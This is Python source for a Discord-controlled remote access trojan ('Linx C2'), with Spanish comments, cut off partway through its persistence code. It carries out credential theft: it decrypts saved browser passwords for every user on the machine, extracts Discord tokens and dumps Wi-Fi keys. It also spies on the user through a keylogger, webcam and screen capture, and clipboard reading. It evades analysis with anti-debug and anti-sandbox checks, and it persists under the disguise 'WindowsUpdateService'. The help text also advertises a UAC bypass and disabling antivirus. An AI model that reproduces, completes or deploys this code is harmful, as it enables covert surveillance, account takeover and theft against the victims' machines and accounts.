"""
[L]inx C2
============================================================
Reverse shell, stealer, keylogger, webcam, wifi, procesos,
background tasks, persistence múltiple, anti-sandbox y más.

Uso básico:
    Token por variable de entorno DISCORD_TOKEN (recomendado)
    o se usa el embebido por defecto.
    GUILD_ID por entorno o el embebido.

Comandos:
    !help              -> lista completa
    !shell / !exitshell -> shell interactiva en el canal
    !sysinfo !ip !geo !status !uptime
    !screenshot !screenshotall !webcam
    !paperclip !keylog <seg> !keylogstop
    !passwords !history !token !wifi
    !tasklist !taskkill <pid> !netstat !procident
    !ls <path> !cd <path> !pwd !rm <path> !mkdir <dir>
    !download <url> [path]   (URL -> host)
    !sendfile <ruta>         (host -> Discord)
    !getfile                 (Discord -> host)
    !exec <cmd> !bg <cmd> !bgoutput <id> !bglist
    !py <codigo>             (ejecuta Python en el host)
    !persistence !unpersistence !persistcheck
    !disableantivirus !uacbypass !admincheck !elevate
    !bluescreen !fakebluescreen !shutdown !exit
============================================================
"""

import asyncio
import base64
import ctypes
import datetime
import json
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import string
import subprocess
import sys
import tempfile
import threading
import time
import winreg
from pathlib import Path
from typing import Optional

# ── Dependencias opcionales (fallback si no están) ──
try:
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    from win32crypt import CryptUnprotectData
    HAS_DPAPI = True
except ImportError:
    HAS_DPAPI = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    import pyautogui
    HAS_PYAUTOGUI = True
except ImportError:
    HAS_PYAUTOGUI = False

try:
    import pyperclip
    HAS_CLIPBOARD = True
except ImportError:
    HAS_CLIPBOARD = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import qrcode
    HAS_QR = True
except ImportError:
    HAS_QR = False

try:
    import tkinter as tk
    HAS_TK = True
except ImportError:
    HAS_TK = False

import discord
from discord.ext import commands

# ──────────────────────────────────────────────────────────────
# CONFIGURACIÓN (env > embebido)
# ──────────────────────────────────────────────────────────────

TOKEN = os.getenv("DISCORD_TOKEN", "")
GUILD_ID = int(os.getenv("GUILD_ID", ""))
OWNER_ID = int(os.getenv("OWNER_ID", "0"))          # 0 = cualquiera (no recomendado)
HEARTBEAT_INTERVAL = int(os.getenv("HEARTBEAT_INTERVAL", "60"))
PREFIX = os.getenv("BOT_PREFIX", "!")
BOT_NAME = "WindowsUpdateService"
MAX_MSG = 1900
SHELL_TIMEOUT = int(os.getenv("SHELL_TIMEOUT", "60"))

# ──────────────────────────────────────────────────────────────
# ANTI-DEBUG / ANTI-SANDBOX 
# ──────────────────────────────────────────────────────────────

SANDBOX_PROCESSES = [
    "vboxservice.exe", "vboxtray.exe", "vmsrvc.exe", "vmwaretray.exe",
    "vmwareuser.exe", "vmacthlp.exe", "xenservice.exe", "sandboxierpcss.exe",
    "wireshark.exe", "procmon.exe", "procexp.exe", "ida64.exe", "ida.exe",
    "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "fiddler.exe", "charles.exe",
    "httpdebugger.exe", "dnspy.exe", "de4dot.exe", "dumpcap.exe",
]

def is_debugged():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
            return True
        # Peb BeingDebugged
        peb = ctypes.windll.ntdll.NtCurrentTeb()
        return bool(ctypes.c_ubyte.from_address(peb + 0x02).value)
    except Exception:
        return False

def is_sandbox():
    try:
        if HAS_PSUTIL:
            mem = psutil.virtual_memory()
            if mem.total < 2 * 1024**3:
                return True
            if psutil.cpu_count(logical=False) < 2:
                return True
            try:
                disk = psutil.disk_usage('C:\\')
                if disk.total < 25 * 1024**3:
                    return True
            except Exception:
                pass
            # Procesos típicos de sandbox/análisis
            for proc in psutil.process_iter(['name']):
                name = (proc.info.get('name') or '').lower()
                if name in SANDBOX_PROCESSES:
                    return True
        try:
            boot = datetime.datetime.fromtimestamp(psutil.boot_time())
            uptime_min = (datetime.datetime.now() - boot).total_seconds() / 60
            if uptime_min < 15:
                return True
        except Exception:
            pass
        try:
            mac = get_mac_address()
            if mac:
                prefixes = ('000c29', '005056', '080027', '00155d', '001c42')
                if mac.replace(':', '').lower().startswith(prefixes):
                    return True
        except Exception:
            pass
    except Exception:
        pass
    return False

def get_mac_address():
    try:
        import uuid
        return ':'.join(f'{b:02x}' for b in uuid.getnode().to_bytes(6, 'big'))
    except Exception:
        return None

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

# ──────────────────────────────────────────────────────────────
# UTILIDADES
# ──────────────────────────────────────────────────────────────

def get_public_ip():
    if HAS_REQUESTS:
        try:
            return requests.get('https://api.ipify.org?format=json', timeout=4).json().get('ip')
        except Exception:
            pass
    try:
        return socket.gethostbyname(socket.gethostname()) or None
    except Exception:
        return None

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "127.0.0.1"

def get_env(var):
    return os.environ.get(var, "")

def hide_console_window():
    """Devuelve STARTUPINFO para no mostrar ventanas de consola."""
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    return si

def run_cmd(command, timeout=SHELL_TIMEOUT):
    """Ejecuta un comando y devuelve (exit_code, output)."""
    kwargs = dict(
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.DEVNULL,
    )
    try:
        kwargs['startupinfo'] = hide_console_window()
        kwargs['creationflags'] = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
    except Exception:
        pass
    try:
        proc = subprocess.Popen(command, **kwargs)
    except TypeError:
        # Algunas versiones no aceptan startupinfo+creationflags juntos
        kwargs.pop('startupinfo', None)
        proc = subprocess.Popen(command, **kwargs)
    try:
        stdout, stderr = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        stdout, stderr = proc.communicate()
        return (proc.returncode, f"[⏰ Timeout a los {timeout}s]\n" + safe_decode(stdout) + safe_decode(stderr))
    output = safe_decode(stdout) + safe_decode(stderr)
    return (proc.returncode, output)

def safe_decode(data):
    if not data:
        return ""
    try:
        return data.decode('utf-8', errors='replace')
    except Exception:
        try:
            return data.decode('cp437', errors='replace')
        except Exception:
            return repr(data)

def paginate(text, chunk=MAX_MSG):
    """Divide texto largo en trozos para Discord."""
    if not text:
        return ["(sin salida)"]
    return [text[i:i+chunk] for i in range(0, len(text), chunk)]

async def send_paginated(channel, text, wrap="```", lang=""):
    for piece in paginate(text):
        await channel.send(f"{wrap}{lang}\n{piece}{wrap if wrap else ''}")

def unpad_pkcs7(data):
    try:
        pad = data[-1]
        if 1 <= pad <= 16 and data[-pad:] == bytes([pad]) * pad:
            return data[:-pad]
    except Exception:
        pass
    return data

# ──────────────────────────────────────────────────────────────
# MASTER KEY / DECRYPT (Chrome/Edge/Brave)
# ──────────────────────────────────────────────────────────────

LOGIN_DIAGNOSTICS = {}

def get_master_key(local_state_path):
    """Extrae la master key de Chrome/Edge/Brave. Devuelve (key, version, extra)."""
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        os_crypt = local_state.get("os_crypt", {})
        encrypted_key = os_crypt.get("encrypted_key", "")
        if not encrypted_key:
            return None, None, "no encrypted_key en Local State"

        raw_b64 = encrypted_key
        version = "v10"
        if str(raw_b64).startswith("v20"):
            version = "v20"
        elif str(raw_b64).startswith("v21"):
            version = "v21"

        raw = base64.b64decode(raw_b64)

        # ── v10: blob "DPAPI" + cifrado DPAPI, o clave plana ──
        if version == "v10":
            blob = raw[5:] if raw.startswith(b"DPAPI") else raw
            if HAS_DPAPI and raw.startswith(b"DPAPI"):
                try:
                    key = CryptUnprotectData(blob, None, None, None, 0)[1]
                    if key:
                        return key, version, "ok"
                except Exception as e:
                    return None, version, f"DPAPI falló (v10): {e}"
            # Clave plana (Opera/Vivaldi antiguos): el propio blob es la clave
            if len(blob) == 32:
                return blob, version, "ok (clave plana)"
            return None, version, f"blob v10 inválido ({len(blob)} bytes)"

        # ── v20/v21: App-Bound Encryption (Chrome 127+ / Edge 2025) ──
        # Estructura: 1 byte flag + 12 bytes nonce + datos
        if len(raw) >= 13 and raw[0] in (1, 2, 3):
            try:
                # Método 1: DPAPI directo sobre el blob completo
                if HAS_DPAPI:
                    key = CryptUnprotectData(raw, None, None, None, 0)[1]
                    if key and len(key) == 32:
                        return key, version, "ok (DPAPI v20)"
            except Exception:
                pass
            try:
                # Método 2: DPAPI con entropy del registro del perfil
                import win32crypt
                from win32crypt import CryptUnprotectData as CUD
                sid = None
                try:
                    import subprocess as sp
                    whoami = sp.run(['whoami', '/user'], capture_output=True, text=True, shell=True)
                    m = re.search(r'S-1-5-21-\S+', whoami.stdout)
                    if m:
                        sid = m.group(0)
                except Exception:
                    pass
                if sid:
                    key = CUD(raw, None, None, None, 0)[1]
                    if key and len(key) == 32:
                        return key, version, "ok (DPAPI v20 con SID)"
            except Exception:
                pass
            return None, version, "v20 requires App-Bound key (Chrome >=127)"

        return None, version, f"formato desconocido (len={len(raw)})"
    except Exception as e:
        return None, None, f"error lectura: {e}"

def decrypt_value(encrypted, master_key):
    """AES-GCM (Chrome/Edge/Brave). Soporta v10 y legacy."""
    if not HAS_CRYPTO or not master_key:
        return ""
    try:
        data = bytes(encrypted)
        # Formato estándar: b'v10' (3) + nonce(12) + ciphertext + tag(16)
        if data[:3] == b'v10':
            nonce = data[3:15]
            ciphertext = data[15:-16]
            tag = data[-16:]
        # Formato legacy: nonce(12) + ciphertext + tag(16)
        elif len(data) >= 28:
            nonce = data[:12]
            ciphertext = data[12:-16]
            tag = data[-16:]
        else:
            return ""
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8', errors='ignore')
    except Exception:
        return ""

# ──────────────────────────────────────────────────────────────
# FIREFOX DECRYPT (key4.db + logins.json)
# ──────────────────────────────────────────────────────────────

def get_firefox_key(profile_path):
    """Devuelve la clave AES de Firefox (sin contraseña maestra)."""
    key_db = os.path.join(profile_path, "key4.db")
    temp_db = os.path.join(tempfile.gettempdir(), f"ffkey_{os.getpid()}.db")
    key = None
    try:
        if os.path.exists(key_db):
            shutil.copy2(key_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cur = conn.cursor()
            cur.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
            row = cur.fetchone()
            conn.close()
            if row and row[1]:
                decoded = base64.b64decode(row[1])
                key = decoded
                # Moderno: ASN.1 CKA_VALUE -> la clave real son los últimos 32 bytes
                if len(decoded) > 32:
                    key = decoded[-32:]
    except Exception:
        pass
    finally:
        try:
            os.remove(temp_db)
        except Exception:
            pass
    return key

def firefox_decrypt(data, key):
    """Descifra un campo de logins.json de Firefox."""
    if not HAS_CRYPTO or not key or not data:
        return ""
    try:
        if data[0] == 1:  # formato antiguo, IV 8 bytes
            iv = data[1:9]
            ciphertext = data[9:]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            return unpad_pkcs7(cipher.decrypt(ciphertext)).decode('utf-8', errors='ignore')
        elif data[0] == 2:  # formato nuevo, IV 16 bytes
            iv = data[1:17]
            ciphertext = data[17:]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            return unpad_pkcs7(cipher.decrypt(ciphertext)).decode('utf-8', errors='ignore')
    except Exception:
        pass
    return ""

# ──────────────────────────────────────────────────────────────
# EXTRACCIÓN — CONTRASEÑAS (todos los navegadores)
# ──────────────────────────────────────────────────────────────

def _discover_browser_dirs():
    """Descubre rutas reales de cada navegador para TODOS los usuarios de C:\\Users."""
    patterns = {
        "Chrome":  [r"C:\Users\{u}\AppData\Local\Google\Chrome\User Data",
                    r"C:\Users\{u}\AppData\Roaming\Google\Chrome\User Data"],
        "Edge":    [r"C:\Users\{u}\AppData\Local\Microsoft\Edge\User Data"],
        "Brave":   [r"C:\Users\{u}\AppData\Local\BraveSoftware\Brave-Browser\User Data"],
        "Opera":   [r"C:\Users\{u}\AppData\Roaming\Opera Software\Opera Stable",
                    r"C:\Users\{u}\AppData\Local\Opera Software\Opera Stable"],
        "Vivaldi": [r"C:\Users\{u}\AppData\Local\Vivaldi\User Data"],
    }
    users = []
    try:
        base = "C:\\Users"
        users = [d for d in os.listdir(base) if os.path.isdir(os.path.join(base, d))]
    except Exception:
        pass
    cur = os.getenv("USERNAME")
    if cur and cur not in users:
        users.append(cur)

    found = {}
    for browser, pats in patterns.items():
        dirs = []
        for u in users:
            for p in pats:
                full = p.format(u=u)
                if os.path.exists(full):
                    dirs.append(full)
        if dirs:
            found[browser] = dirs
    return found

def extract_browser_creds():
    results = {}
    browsers = _discover_browser_dirs()

    for browser_name, browser_paths in browsers.items():
        for browser_path in browser_paths:
            LOGIN_DIAGNOSTICS[f"{browser_name}:path"] = "existe"
            local_state_path = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state_path):
                LOGIN_DIAGNOSTICS[f"{browser_name}:local_state ({browser_path})"] = "no existe"
                continue

            master_key, key_version, diag = get_master_key(local_state_path)
            LOGIN_DIAGNOSTICS[f"{browser_name}:master_key ({browser_path})"] = (f"{key_version}:{diag}" if key_version else diag)
            if not master_key:
                continue

            profiles = ["Default"]
            try:
                for item in os.listdir(browser_path):
                    if item.startswith("Profile ") and os.path.isdir(os.path.join(browser_path, item)):
                        profiles.append(item)
            except Exception:
                pass

            for profile in profiles:
                creds = []
                profile_path = os.path.join(browser_path, profile)

                # "Login Data" principal + "Login Data For Account" (nuevo Chrome)
                for db_name in ("Login Data", "Login Data For Account"):
                    login_db = os.path.join(profile_path, db_name)
                    if not os.path.exists(login_db):
                        continue
                    LOGIN_DIAGNOSTICS[f"{browser_name}:{profile}:{db_name}"] = "existe"
                    try:
                        # URI mode=ro&immutable=1: permite leer la DB aunque Chrome esté
                        # abierto con lock exclusivo. No requiere copiar el archivo.
                        conn = sqlite3.connect(f"file:{login_db}?mode=ro&immutable=1", uri=True)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        rows = cursor.fetchall()
                        conn.close()
                    except Exception:
                        # Fallback: copiar y leer (si Chrome no la tiene bloqueada)
                        try:
                            temp_db = os.path.join(tempfile.gettempdir(),
                                                   f"{browser_name}_{profile.replace(' ', '_')}_{os.getpid()}.db")
                            shutil.copy2(login_db, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            rows = cursor.fetchall()
                            conn.close()
                            try:
                                os.remove(temp_db)
                            except Exception:
                                pass
                        except Exception as e:
                            LOGIN_DIAGNOSTICS[f"{browser_name}:{profile}:{db_name}:error"] = f"no se pudo leer: {e}"
                            continue

                    for url, username, encrypted in rows:
                        if not encrypted or len(encrypted) < 16:
                            continue
                        decrypted = decrypt_value(encrypted, master_key)
                        if decrypted:
                            creds.append({
                                "site": url or "Unknown",
                                "username": username or "",
                                "password": decrypted,
                            })

            if creds:
                # Deduplicar y devolver DICTS (no tuplas — el comando accede por clave)
                seen = set()
                unique = []
                for c in creds:
                    key = (c['site'], c['username'], c['password'])
                    if key not in seen:
                        seen.add(key)
                        unique.append(c)
                results[f"{browser_name} ({profile})"] = sorted(unique, key=lambda x: x['site'])
                LOGIN_DIAGNOSTICS[f"{browser_name}:{profile}:creds"] = len(results[f"{browser_name} ({profile})"])
            else:
                LOGIN_DIAGNOSTICS[f"{browser_name}:{profile}:rows"] = f"{len(rows) if 'rows' in dir() else 0} filas"
                LOGIN_DIAGNOSTICS[f"{browser_name}:{profile}:no_creds"] = "0 descifradas"

    # Firefox (descifrado real) — todos los usuarios
    user = os.getenv('USERNAME')
    try:
        ff_users = []
        try:
            base = "C:\\Users"
            ff_users = [d for d in os.listdir(base) if os.path.isdir(os.path.join(base, d))]
        except Exception:
            pass
        if user and user not in ff_users:
            ff_users.append(user)

        for ff_user in ff_users:
            ff_base = f"C:\\Users\\{ff_user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
            if not os.path.exists(ff_base):
                continue
            for profile in os.listdir(ff_base):
                profile_path = os.path.join(ff_base, profile)
                logins_path = os.path.join(profile_path, "logins.json")
                if not os.path.exists(logins_path):
                    continue
                try:
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                    entries = data.get("logins", [])
                    if not entries:
                        continue
                    key = get_firefox_key(profile_path)
                    creds = []
                    for entry in entries:
                        try:
                            raw_user = base64.b64decode(entry.get("encryptedUsername", "") or "")
                            raw_pass = base64.b64decode(entry.get("encryptedPassword", "") or "")
                            uname = firefox_decrypt(raw_user, key) if raw_user else ""
                            pwd = firefox_decrypt(raw_pass, key) if raw_pass else ""
                            if uname or pwd:
                                creds.append({
                                    "site": entry.get("hostname", ""),
                                    "username": uname,
                                    "password": pwd,
                                })
                        except Exception:
                            continue
                    if creds:
                        label = f"Firefox ({profile})"
                        if not key:
                            label += " [clave no descifrada: ¿contraseña maestra?]"
                        results[label] = creds
                except Exception:
                    continue
    except Exception:
        pass

    return results

# ──────────────────────────────────────────────────────────────
# EXTRACCIÓN — HISTORIAL
# ──────────────────────────────────────────────────────────────

def _discover_users():
    """Devuelve la lista de usuarios de C:\\Users + el actual."""
    users = []
    try:
        base = "C:\\Users"
        users = [d for d in os.listdir(base) if os.path.isdir(os.path.join(base, d))]
    except Exception:
        pass
    cur = os.getenv("USERNAME")
    if cur and cur not in users:
        users.append(cur)
    return users

def _read_chromium_history(history_path, limit):
    """Lee una DB de historial Chromium sin bloquear (immutable + fallback copia)."""
    try:
        conn = sqlite3.connect(f"file:{history_path}?mode=ro&immutable=1", uri=True)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        urls = [(row[0], row[1] or "") for row in cursor.fetchall() if row[0]]
        conn.close()
        return urls
    except Exception:
        pass
    try:
        temp_db = os.path.join(tempfile.gettempdir(), f"hist_{os.getpid()}_{int(time.time())}.db")
        shutil.copy2(history_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        urls = [(row[0], row[1] or "") for row in cursor.fetchall() if row[0]]
        conn.close()
        try:
            os.remove(temp_db)
        except Exception:
            pass
        return urls
    except Exception:
        pass
    return []

def _read_firefox_history(places_path, limit):
    """Lee places.sqlite de Firefox sin bloquear."""
    try:
        conn = sqlite3.connect(f"file:{places_path}?mode=ro&immutable=1", uri=True)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT url, title FROM moz_places WHERE url != '' ORDER BY last_visit_date DESC LIMIT ?",
            (limit,)
        )
        urls = [(row[0], row[1] or "") for row in cursor.fetchall()]
        conn.close()
        return urls
    except Exception:
        pass
    try:
        temp_db = os.path.join(tempfile.gettempdir(), f"ffhist_{os.getpid()}_{int(time.time())}.db")
        shutil.copy2(places_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT url, title FROM moz_places WHERE url != '' ORDER BY last_visit_date DESC LIMIT ?",
            (limit,)
        )
        urls = [(row[0], row[1] or "") for row in cursor.fetchall()]
        conn.close()
        try:
            os.remove(temp_db)
        except Exception:
            pass
        return urls
    except Exception:
        pass
    return []

def extract_browser_history(limit=500):
    results = {}

    # Chromium (multi-usuario, multi-perfil)
    browsers = _discover_browser_dirs()
    for browser, dirs in browsers.items():
        for base_dir in dirs:
            try:
                profiles = ["Default"]
                for item in os.listdir(base_dir):
                    if item.startswith("Profile ") and os.path.isdir(os.path.join(base_dir, item)):
                        profiles.append(item)
            except Exception:
                profiles = ["Default"]
            for profile in profiles:
                for db_name in ("History", "History For Account"):
                    hist_path = os.path.join(base_dir, profile, db_name)
                    if not os.path.exists(hist_path):
                        continue
                    urls = _read_chromium_history(hist_path, limit)
                    if urls:
                        key = f"{browser} ({profile})"
                        if key in results:
                            results[key] = list(dict.fromkeys(results[key] + urls))[:limit]
                        else:
                            results[key] = urls

    # Firefox (multi-usuario)
    for ff_user in _discover_users():
        ff_base = f"C:\\Users\\{ff_user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        if not os.path.exists(ff_base):
            continue
        try:
            for profile in os.listdir(ff_base):
                places_path = os.path.join(ff_base, profile, "places.sqlite")
                if not os.path.exists(places_path):
                    continue
                urls = _read_firefox_history(places_path, limit)
                if urls:
                    results[f"Firefox ({profile})"] = urls
        except Exception:
            continue

    return results

# ──────────────────────────────────────────────────────────────
# EXTRACCIÓN — TOKENS DE DISCORD
# ──────────────────────────────────────────────────────────────

def extract_discord_tokens():
    results = []
    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}')
    encrypted_regex = re.compile(r'dQw4w9WgXcQ:([^\"]+)')

    paths = {
        'Discord':          os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary':   os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb\\',
        'Discord PTB':      os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb\\',
        'Chrome':           os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Opera':            os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Brave':            os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Edge':             os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Vivaldi':          os.getenv('LOCALAPPDATA') + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Opera GX':         os.getenv('APPDATA') + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    }

    for app, path in paths.items():
        if not os.path.exists(path):
            continue

        master_key = None
        if 'discord' in app.lower():
            local_state = os.path.join(os.path.dirname(os.path.dirname(path)), 'Local State')
            if os.path.exists(local_state):
                master_key, _, _ = get_master_key(local_state)
        elif app in ('Chrome', 'Brave', 'Edge', 'Vivaldi'):
            local_state = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(path))), 'Local State')
            if os.path.exists(local_state):
                master_key, _, _ = get_master_key(local_state)

        try:
            files = os.listdir(path)
        except Exception:
            continue

        for file in files:
            if not file.endswith(('.log', '.ldb')):
                continue
            try:
                with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
            except Exception:
                continue

            if master_key and 'discord' in app.lower():
                for match in encrypted_regex.findall(content):
                    try:
                        encrypted = base64.b64decode(match)
                        token = decrypt_value(encrypted, master_key)
                        if token and token_regex.match(token):
                            if token not in [t['token'] for t in results]:
                                results.append({"app": app, "token": token})
                    except Exception:
                        pass

            for match in token_regex.findall(content):
                if match not in [t['token'] for t in results]:
                    results.append({"app": app, "token": match})

    return results

# ──────────────────────────────────────────────────────────────
# WIFI — contraseñas guardadas
# ──────────────────────────────────────────────────────────────

def get_wifi_passwords():
    wifi_list = []
    try:
        code, out = run_cmd("netsh wlan show profiles", timeout=15)
        if code != 0:
            return wifi_list
        profiles = re.findall(r"All User Profile\s*:\s*(.+)", out)
        for profile in profiles:
            profile = profile.strip()
            try:
                _, detail = run_cmd(f'netsh wlan show profile name="{profile}" key=clear', timeout=15)
                key_match = re.search(r"Key Content\s*:\s*(.+)", detail)
                password = key_match.group(1).strip() if key_match else "(sin clave)"
                wifi_list.append({"ssid": profile, "password": password})
            except Exception:
                continue
    except Exception:
        pass
    return wifi_list

# ──────────────────────────────────────────────────────────────
# SISTEMA — para obtener info
# ──────────────────────────────────────────────────────────────

def get_system_info():
    try:
        hostname = socket.gethostname()
        ip = get_local_ip()
        cpu_info = {"name": platform.processor() or "Unknown", "percent": 0}
        ram_info = {"total": 0, "free": 0, "percent": 0}
        disk_info = {"total": 0, "free": 0}
        try:
            if HAS_PSUTIL:
                cpu_info["percent"] = psutil.cpu_percent(interval=0.3)
                ram = psutil.virtual_memory()
                ram_info = {"total": ram.total // (1024**3), "free": ram.available // (1024**3), "percent": ram.percent}
                disk = psutil.disk_usage('C:\\')
                disk_info = {"total": disk.total // (1024**3), "free": disk.free // (1024**3)}
        except Exception:
            pass
        return {
            "hostname": hostname,
            "user": get_env("USERNAME") or get_env("USER"),
            "ip": ip,
            "os": platform.system() + " " + platform.version(),
            "arch": platform.machine(),
            "cpu": cpu_info["name"],
            "cpu_percent": cpu_info["percent"],
            "ram_total": ram_info["total"],
            "ram_free": ram_info["free"],
            "ram_percent": ram_info["percent"],
            "disk_total": disk_info["total"],
            "disk_free": disk_info["free"],
            "admin": is_admin(),
            "pid": os.getpid(),
            "python": sys.version.split()[0],
        }
    except Exception as e:
        return {"error": str(e)}

def get_geo(ip=None):
    if not HAS_REQUESTS:
        return None
    ip = ip or get_public_ip()
    if not ip:
        return None
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        d = r.json()
        if d.get('status') == 'success':
            return d
    except Exception:
        pass
    return None

def take_screenshot(all_screens=False):
    try:
        if HAS_PYAUTOGUI:
            try:
                ss = pyautogui.screenshot(allScreens=all_screens)
            except TypeError:
                ss = pyautogui.screenshot()
            path = os.path.join(tempfile.gettempdir(), f"ss_{int(time.time())}.png")
            ss.save(path)
            return path
        elif HAS_PIL:
            img = ImageGrab.grab(all_screens=all_screens)
            path = os.path.join(tempfile.gettempdir(), f"ss_{int(time.time())}.png")
            img.save(path)
            return path
    except Exception:
        pass
    return None

def get_clipboard():
    if HAS_CLIPBOARD:
        try:
            return pyperclip.paste()
        except Exception:
            pass
    return "(no se pudo leer)"

def capture_webcam():
    """Captura frame de la webcam. Devuelve ruta o None."""
    if not HAS_CV2:
        return None
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if not ret or frame is None:
            return None
        path = os.path.join(tempfile.gettempdir(), f"cam_{int(time.time())}.jpg")
        cv2.imwrite(path, frame)
        return path
    except Exception:
        return None

# ──────────────────────────────────────────────────────────────
# KEYLOGGER (ctypes, sin dependencias)
# ──────────────────────────────────────────────────────────────

KEYLOG_FILE = os.path.join(tempfile.gettempdir(), f"keylog_{os.getpid()}.txt")
_keylog_thread = None
_keylog_running = False

def _key_name(code):
    specials = {
        8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]", 27: "[ESC]", 32: " ",
        35: "[END]", 36: "[HOME]", 37: "[←]", 38: "[↑]", 39: "[→]", 40: "[↓]",
        45: "[INS]", 46: "[DEL]", 186: ";", 187: "=", 188: ",", 189: "-",
        190: ".", 191: "/", 192: "`", 219: "[", 220: "\\", 221: "]", 222: "'",
    }
    if code in specials:
        return specials[code]
    if 48 <= code <= 57:
        return chr(code)
    if 65 <= code <= 90:
        # Mayúsculas activas = mayúscula, si no minúscula
        try:
            caps = ctypes.windll.user32.GetKeyState(0x14) & 1
            shift = ctypes.windll.user32.GetKeyState(0x10) & 0x8000
            if caps ^ bool(shift):
                return chr(code)
            return chr(code).lower()
        except Exception:
            return chr(code).lower()
    if 96 <= code <= 105:
        return str(code - 96)
    return ""

def _keylog_loop():
    global _keylog_running
    with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
        while _keylog_running:
            try:
                for code in range(256):
                    if ctypes.windll.user32.GetAsyncKeyState(code) & 0x0001:
                        f.write(_key_name(code))
                        f.flush()
            except Exception:
                pass
            time.sleep(0.03)

def start_keylogger():
    global _keylog_thread, _keylog_running
    if _keylog_running:
        return KEYLOG_FILE, True
    _keylog_running = True
    _keylog_thread = threading.Thread(target=_keylog_loop, daemon=True)
    _keylog_thread.start()
    return KEYLOG_FILE, False

def stop_keylogger():
    global _keylog_running
    if not _keylog_running:
        return KEYLOG_FILE, False
    _keylog_running = False
    if _keylog_thread:
        _keylog_thread.join(timeout=2)
    return KEYLOG_FILE, True

def capture_keylog_timed(duration=30):
    """Captura teclado durante N segundos y devuelve el texto."""
    temp = os.path.join(tempfile.gettempdir(), f"keylog_timed_{int(time.time())}.txt")
    end = time.time() + duration
    with open(temp, 'a', encoding='utf-8') as f:
        while time.time() < end:
            try:
                for code in range(256):
                    if ctypes.windll.user32.GetAsyncKeyState(code) & 0x0001:
                        f.write(_key_name(code))
                        f.flush()
            except Exception:
                pass
            time.sleep(0.03)
    return temp

# ──────────────────────────────────────────────────────────────
# PERSISTENCIA 
# ──────────────────────────────────────────────────────────────

RUN_KEY_HKCU = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_KEY_HKLM = r"Software\Microsoft\Windows\CurrentVersion\Run"
SCHED_TASK = "WindowsUpdateService"
SVC_NAME = "WindowsUpdateService"
STARTUP_NAME = "WindowsUpdateService.vbs"

def _target_path():
    """Ruta del binario/script actual."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(__file__)

def _install_copy():
    """Copia el binario a %APPDATA%\\WindowsUpdate si no está ahí."""
    try:
        if getattr(sys, 'frozen', False):
